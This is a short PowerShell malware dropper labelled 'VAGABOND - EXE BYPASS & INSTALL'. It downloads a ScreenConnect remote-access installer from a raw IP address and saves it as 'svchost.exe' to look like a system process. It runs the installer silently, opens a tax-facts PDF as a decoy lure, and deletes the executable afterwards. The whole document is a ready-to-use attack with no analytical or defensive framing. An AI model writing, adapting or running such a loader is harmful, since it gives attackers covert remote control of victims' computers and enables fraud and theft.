# VAGABOND - EXE BYPASS & INSTALL
$Url = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
$ExeFile = "$env:TEMP\svchost.exe"
$pdfLink = "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"

try {
    Invoke-WebRequest -Uri $Url -OutFile $ExeFile -UseBasicParsing
    Start-Process $ExeFile -ArgumentList "/silent" -WindowStyle Normal
    Start-Sleep -Seconds 30
    Start-Process $pdfLink
    Remove-Item $ExeFile -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Failed: $_"
}
